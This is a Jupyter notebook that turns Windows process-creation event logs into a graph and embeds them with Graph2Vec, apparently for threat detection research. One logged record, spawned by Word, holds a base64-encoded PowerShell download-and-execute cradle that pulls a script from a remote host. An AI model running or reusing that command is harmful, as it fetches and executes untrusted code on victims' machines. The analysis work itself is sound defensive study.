{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 39,
   "id": "c639c92b",
   "metadata": {},
   "outputs": [],
   "source": [
    "import networkx as nx\n",
    "from networkx.readwrite import json_graph\n",
    "from karateclub import Graph2Vec\n",
    "from pprint import pprint"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "id": "aaf3e815",
   "metadata": {},
   "outputs": [],
   "source": [
    "graphjson = {\n",
    "    \"directed\": \"true\",\n",
    "    \"graph\": {},\n",
    "    \"links\": [\n",
    "        {\n",
    "            \"source\": \"62338bcab06e4e09a32079da\",\n",
    "            \"target\": \"62338bf4b06e4e09a3211115\",\n",
    "            \"properties\": {\n",
    "                \"eventID\": 4688,\n",
    "                \"recordNumber\": 47759,\n",
    "                \"computerName\": \"Yura-PC.Beari.local\",\n",
    "                \"accountName\": \"YURA-PC$\",\n",
    "                \"accountDomain\": \"BEARI\",\n",
    "                \"securityID\": \"S-1-5-18\",\n",
    "                \"logonID\": \"0x3e7\",\n",
    "                \"creatorProcessID\": \"0x1404\",\n",
    "                \"creatorProcessName\": \"C:\\\\Windows\\\\System32\\\\CompatTelRunner.exe\",\n",
    "                \"processCommandLine\": \"powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';\",\n",
    "                \"newProcessID\": \"0x1ad4\",\n",
    "                \"newProcessName\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\n",
    "                \"tokenElevationType\": \"%%1936\",\n",
    "                \"mandatoryLabel\": \"S-1-16-16384\",\n",
    "                \"timeString\": \"2022-02-10T17:43:23.815296Z\",\n",
    "                \"mitre-attack\": [\n",
    "                    \"T1086\"\n",
    "                ],\n",
    "                \"time\": \"2022-02-10T17:43:23\",\n",
    "                \"timestamp\": 1644515003,\n",
    "                \"mandatoryLabelReadable\": \"SECURITY_MANDATORY_SYSTEM_RID\",\n",
    "                \"Title\": \"Create_Process\"\n",
    "            }\n",
    "        },\n",
    "        {\n",
    "            \"source\": \"62338bdeb06e4e09a320c29d\",\n",
    "            \"target\": \"62338bf4b06e4e09a3211115\",\n",
    "            \"properties\": {\n",
    "                \"eventID\": 4688,\n",
    "                \"recordNumber\": 48834,\n",
    "                \"computerName\": \"Yura-PC.Beari.local\",\n",
    "                \"accountName\": \"Yura.C\",\n",
    "                \"accountDomain\": \"BEARI\",\n",
    "                \"securityID\": \"S-1-5-21-1967971061-1058293627-512848740-1105\",\n",
    "                \"logonID\": \"0x46ea4\",\n",
    "                \"creatorProcessID\": \"0x410\",\n",
    "                \"creatorProcessName\": \"C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE\",\n",
    "                \"processCommandLine\": \"powershell -nop -noexit -exec ByPass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAYwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBtAHUAbAB0AGkALgB3AG8AcgBsAGQALgBjAG8AbQAvAHMAYwByAGkAcAB0AC4AdAB4AHQAIgApAA==\",\n",
    "                \"newProcessID\": \"0x1940\",\n",
    "                \"newProcessName\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\n",
    "                \"tokenElevationType\": \"%%1938\",\n",
    "                \"mandatoryLabel\": \"S-1-16-8192\",\n",
    "                \"timeString\": \"2022-02-10T17:56:44.243302Z\",\n",
    "                \"mitre-attack\": [\n",
    "                    \"T1086\"\n",
    "                ],\n",
    "                \"time\": \"2022-02-10T17:56:44\",\n",
    "                \"timestamp\": 1644515804,\n",
    "                \"mandatoryLabelReadable\": \"SECURITY_MANDATORY_MEDIUM_RID\",\n",
    "                \"Title\": \"Create_Process\"\n",
    "            }\n",
    "        },\n",
    "        {\n",
    "            \"source\": \"62338c26b06e4e09a321b174\",\n",
    "            \"target\": \"62338c26b06e4e09a321b384\",\n",
    "            \"properties\": {\n",
    "                \"eventID\": 4688,\n",
    "                \"recordNumber\": 30005,\n",
    "                \"computerName\": \"Yura-PC.Beari.local\",\n",
    "                \"accountName\": \"Yura.C\",\n",
    "                \"accountDomain\": \"BEARI\",\n",
    "                \"securityID\": \"S-1-5-21-1967971061-1058293627-512848740-1105\",\n",
    "                \"logonID\": \"0x7cf41\",\n",
    "                \"creatorProcessID\": \"0xd20\",\n",
    "                \"creatorProcessName\": \"C:\\\\Users\\\\Yura.C\\\\Downloads\\\\OfficeSetup.exe\",\n",
    "                \"processCommandLine\": \"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -NoProfile \\\"$package = Get-AppxPackage Microsoft.Office.Desktop -allUsers; if (!$package) { $Error.Add(\\\\\\\"Package is not installed\\\\\\\")}; if ($error.Count -eq 0) { Out-File -FilePath 'C:\\\\Users\\\\Yura.C\\\\AppData\\\\Local\\\\Temp\\\\Office.ValidateResult.scratch' -InputObject '1' -Encoding ascii; } else { Out-File -FilePath 'C:\\\\Users\\\\Yura.C\\\\AppData\\\\Local\\\\Temp\\\\Office.ValidateResult.scratch' -InputObject '0' -Encoding ascii; Out-File -FilePath 'C:\\\\Users\\\\Yura.C\\\\AppData\\\\Local\\\\Temp\\\\Office.ValidateError.scratch' -InputObject $error -Encoding ascii;} \\\"\",\n",
    "                \"newProcessID\": \"0xe88\",\n",
    "                \"newProcessName\": \"C:\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\n",
    "                \"tokenElevationType\": \"%%1937\",\n",
    "                \"mandatoryLabel\": \"S-1-16-12288\",\n",
    "                \"timeString\": \"2022-02-04T08:31:05.153961Z\",\n",
    "                \"mitre-attack\": [\n",
    "                    \"T1086\"\n",
    "                ],\n",
    "                \"time\": \"2022-02-04T08:31:05\",\n",
    "                \"timestamp\": 1643963465,\n",
    "                \"mandatoryLabelReadable\": \"SECURITY_MANDATORY_HIGH_RID\",\n",
    "                \"Title\": \"Create_Process\"\n",
    "            }\n",
    "        },\n",
    "        {\n",
    "            \"source\": \"62338c26b06e4e09a321b174\",\n",
    "            \"target\": \"62338c26b06e4e09a321b384\",\n",
    "            \"properties\": {\n",
    "                \"eventID\": 4688,\n",
    "                \"recordNumber\": 30208,\n",
    "                \"computerName\": \"Yura-PC.Beari.local\",\n",
    "                \"accountName\": \"Yura.C\",\n",
    "                \"accountDomain\": \"BEARI\",\n",
    "                \"securityID\": \"S-1-5-21-1967971061-1058293627-512848740-1105\",\n",
    "                \"logonID\": \"0x7cf41\",\n",
    "                \"creatorProcessID\": \"0xd20\",\n",
    "                \"creatorProcessName\": \"C:\\\\Users\\\\Yura.C\\\\Downloads\\\\OfficeSetup.exe\",\n",
    "                \"processCommandLine\": \"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -NoProfile \\\"$package = Get-AppxPackage Microsoft.Office.Desktop -allUsers; if (!$package) { $Error.Add(\\\\\\\"Package is not installed\\\\\\\")}; if ($error.Count -eq 0) { Out-File -FilePath 'C:\\\\Users\\\\Yura.C\\\\AppData\\\\Local\\\\Temp\\\\Office.ValidateResult.scratch' -InputObject '1' -Encoding ascii; } else { Out-File -FilePath 'C:\\\\Users\\\\Yura.C\\\\AppData\\\\Local\\\\Temp\\\\Office.ValidateResult.scratch' -InputObject '0' -Encoding ascii; Out-File -FilePath 'C:\\\\Users\\\\Yura.C\\\\AppData\\\\Local\\\\Temp\\\\Office.ValidateError.scratch' -InputObject $error -Encoding ascii;} \\\"\",\n",
    "                \"newProcessID\": \"0x1914\",\n",
    "                \"newProcessName\": \"C:\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\n",
    "                \"tokenElevationType\": \"%%1937\",\n",
    "                \"mandatoryLabel\": \"S-1-16-12288\",\n",
    "                \"timeString\": \"2022-02-04T08:32:29.799498Z\",\n",
    "                \"mitre-attack\": [\n",
    "                    \"T1086\"\n",
    "                ],\n",
    "                \"time\": \"2022-02-04T08:32:29\",\n",
    "                \"timestamp\": 1643963549,\n",
    "                \"mandatoryLabelReadable\": \"SECURITY_MANDATORY_HIGH_RID\",\n",
    "                \"Title\": \"Create_Process\"\n",
    "            }\n",
    "        }\n",
    "    ],\n",
    "    \"multigraph\": \"false\",\n",
    "    \"nodes\": [\n",
    "        {\n",
    "            \"id\": \"62338c26b06e4e09a321b174\"\n",
    "        },\n",
    "        {\n",
    "            \"id\": \"62338bf4b06e4e09a3211115\"\n",
    "        },\n",
    "        {\n",
    "            \"id\": \"62338bcab06e4e09a32079da\"\n",
    "        },\n",
    "        {\n",
    "            \"id\": \"62338c26b06e4e09a321b384\"\n",
    "        },\n",
    "        {\n",
    "            \"id\": \"62338bdeb06e4e09a320c29d\"\n",
    "        }\n",
    "    ]\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "id": "58e26c36",
   "metadata": {},
   "outputs": [],
   "source": [
    "G = json_graph.node_link_graph(graphjson)\n",
    "G = nx.convert_node_labels_to_integers(G)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "id": "54f589bc",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "NodeDataView({0: {}, 1: {}, 2: {}, 3: {}, 4: {}})"
      ]
     },
     "execution_count": 49,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "G.nodes(data=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "id": "34c90469",
   "metadata": {},
   "outputs": [],
   "source": [
    "def shiftEdgeAtr2NodeAtr(G):\n",
    "    for u,v,a in G.edges(data=True):\n",
    "        G.nodes[u][\"feature\"] = a['properties']\n",
    "        G.nodes[v][\"feature\"] = a['properties']\n",
    "    return G"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "id": "d63b8f84",
   "metadata": {},
   "outputs": [],
   "source": [
    "G = shiftEdgeAtr2NodeAtr(G)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "id": "7e96306a",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "NodeDataView({0: {'feature': {'eventID': 4688, 'recordNumber': 30208, 'computerName': 'Yura-PC.Beari.local', 'accountName': 'Yura.C', 'accountDomain': 'BEARI', 'securityID': 'S-1-5-21-1967971061-1058293627-512848740-1105', 'logonID': '0x7cf41', 'creatorProcessID': '0xd20', 'creatorProcessName': 'C:\\\\Users\\\\Yura.C\\\\Downloads\\\\OfficeSetup.exe', 'processCommandLine': '\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\" -NoProfile \"$package = Get-AppxPackage Microsoft.Office.Desktop -allUsers; if (!$package) { $Error.Add(\\\\\"Package is not installed\\\\\")}; if ($error.Count -eq 0) { Out-File -FilePath \\'C:\\\\Users\\\\Yura.C\\\\AppData\\\\Local\\\\Temp\\\\Office.ValidateResult.scratch\\' -InputObject \\'1\\' -Encoding ascii; } else { Out-File -FilePath \\'C:\\\\Users\\\\Yura.C\\\\AppData\\\\Local\\\\Temp\\\\Office.ValidateResult.scratch\\' -InputObject \\'0\\' -Encoding ascii; Out-File -FilePath \\'C:\\\\Users\\\\Yura.C\\\\AppData\\\\Local\\\\Temp\\\\Office.ValidateError.scratch\\' -InputObject $error -Encoding ascii;} \"', 'newProcessID': '0x1914', 'newProcessName': 'C:\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe', 'tokenElevationType': '%%1937', 'mandatoryLabel': 'S-1-16-12288', 'timeString': '2022-02-04T08:32:29.799498Z', 'mitre-attack': ['T1086'], 'time': '2022-02-04T08:32:29', 'timestamp': 1643963549, 'mandatoryLabelReadable': 'SECURITY_MANDATORY_HIGH_RID', 'Title': 'Create_Process'}}, 1: {'feature': {'eventID': 4688, 'recordNumber': 48834, 'computerName': 'Yura-PC.Beari.local', 'accountName': 'Yura.C', 'accountDomain': 'BEARI', 'securityID': 'S-1-5-21-1967971061-1058293627-512848740-1105', 'logonID': '0x46ea4', 'creatorProcessID': '0x410', 'creatorProcessName': 'C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE', 'processCommandLine': 'powershell -nop -noexit -exec ByPass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAYwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBtAHUAbAB0AGkALgB3AG8AcgBsAGQALgBjAG8AbQAvAHMAYwByAGkAcAB0AC4AdAB4AHQAIgApAA==', 'newProcessID': '0x1940', 'newProcessName': 'C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe', 'tokenElevationType': '%%1938', 'mandatoryLabel': 'S-1-16-8192', 'timeString': '2022-02-10T17:56:44.243302Z', 'mitre-attack': ['T1086'], 'time': '2022-02-10T17:56:44', 'timestamp': 1644515804, 'mandatoryLabelReadable': 'SECURITY_MANDATORY_MEDIUM_RID', 'Title': 'Create_Process'}}, 2: {'feature': {'eventID': 4688, 'recordNumber': 47759, 'computerName': 'Yura-PC.Beari.local', 'accountName': 'YURA-PC$', 'accountDomain': 'BEARI', 'securityID': 'S-1-5-18', 'logonID': '0x3e7', 'creatorProcessID': '0x1404', 'creatorProcessName': 'C:\\\\Windows\\\\System32\\\\CompatTelRunner.exe', 'processCommandLine': \"powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';\", 'newProcessID': '0x1ad4', 'newProcessName': 'C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe', 'tokenElevationType': '%%1936', 'mandatoryLabel': 'S-1-16-16384', 'timeString': '2022-02-10T17:43:23.815296Z', 'mitre-attack': ['T1086'], 'time': '2022-02-10T17:43:23', 'timestamp': 1644515003, 'mandatoryLabelReadable': 'SECURITY_MANDATORY_SYSTEM_RID', 'Title': 'Create_Process'}}, 3: {'feature': {'eventID': 4688, 'recordNumber': 30208, 'computerName': 'Yura-PC.Beari.local', 'accountName': 'Yura.C', 'accountDomain': 'BEARI', 'securityID': 'S-1-5-21-1967971061-1058293627-512848740-1105', 'logonID': '0x7cf41', 'creatorProcessID': '0xd20', 'creatorProcessName': 'C:\\\\Users\\\\Yura.C\\\\Downloads\\\\OfficeSetup.exe', 'processCommandLine': '\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\" -NoProfile \"$package = Get-AppxPackage Microsoft.Office.Desktop -allUsers; if (!$package) { $Error.Add(\\\\\"Package is not installed\\\\\")}; if ($error.Count -eq 0) { Out-File -FilePath \\'C:\\\\Users\\\\Yura.C\\\\AppData\\\\Local\\\\Temp\\\\Office.ValidateResult.scratch\\' -InputObject \\'1\\' -Encoding ascii; } else { Out-File -FilePath \\'C:\\\\Users\\\\Yura.C\\\\AppData\\\\Local\\\\Temp\\\\Office.ValidateResult.scratch\\' -InputObject \\'0\\' -Encoding ascii; Out-File -FilePath \\'C:\\\\Users\\\\Yura.C\\\\AppData\\\\Local\\\\Temp\\\\Office.ValidateError.scratch\\' -InputObject $error -Encoding ascii;} \"', 'newProcessID': '0x1914', 'newProcessName': 'C:\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe', 'tokenElevationType': '%%1937', 'mandatoryLabel': 'S-1-16-12288', 'timeString': '2022-02-04T08:32:29.799498Z', 'mitre-attack': ['T1086'], 'time': '2022-02-04T08:32:29', 'timestamp': 1643963549, 'mandatoryLabelReadable': 'SECURITY_MANDATORY_HIGH_RID', 'Title': 'Create_Process'}}, 4: {'feature': {'eventID': 4688, 'recordNumber': 48834, 'computerName': 'Yura-PC.Beari.local', 'accountName': 'Yura.C', 'accountDomain': 'BEARI', 'securityID': 'S-1-5-21-1967971061-1058293627-512848740-1105', 'logonID': '0x46ea4', 'creatorProcessID': '0x410', 'creatorProcessName': 'C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE', 'processCommandLine': 'powershell -nop -noexit -exec ByPass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAYwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBtAHUAbAB0AGkALgB3AG8AcgBsAGQALgBjAG8AbQAvAHMAYwByAGkAcAB0AC4AdAB4AHQAIgApAA==', 'newProcessID': '0x1940', 'newProcessName': 'C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe', 'tokenElevationType': '%%1938', 'mandatoryLabel': 'S-1-16-8192', 'timeString': '2022-02-10T17:56:44.243302Z', 'mitre-attack': ['T1086'], 'time': '2022-02-10T17:56:44', 'timestamp': 1644515804, 'mandatoryLabelReadable': 'SECURITY_MANDATORY_MEDIUM_RID', 'Title': 'Create_Process'}}})"
      ]
     },
     "execution_count": 53,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "G.nodes(data=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "id": "af63c768",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([[ 0.11426677,  0.13394493,  0.11418539, -0.10962367, -0.12136849,\n",
       "        -0.0647639 , -0.06125388],\n",
       "       [ 0.06590019, -0.09505019, -0.12065826, -0.06616901,  0.13858527,\n",
       "        -0.06662365,  0.02134782],\n",
       "       [ 0.12559888,  0.06188498, -0.01387845,  0.13328351, -0.08495205,\n",
       "         0.07895868,  0.05760411],\n",
       "       [-0.050201  , -0.01327372, -0.1257536 ,  0.00068841, -0.03795406,\n",
       "         0.14155677, -0.06744976]], dtype=float32)"
      ]
     },
     "execution_count": 37,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "graphlist = [G, G, G, G]\n",
    "model = Graph2Vec(dimensions=7, attributed=True)\n",
    "model.fit(graphlist)\n",
    "model.get_embedding()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ac474f27",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
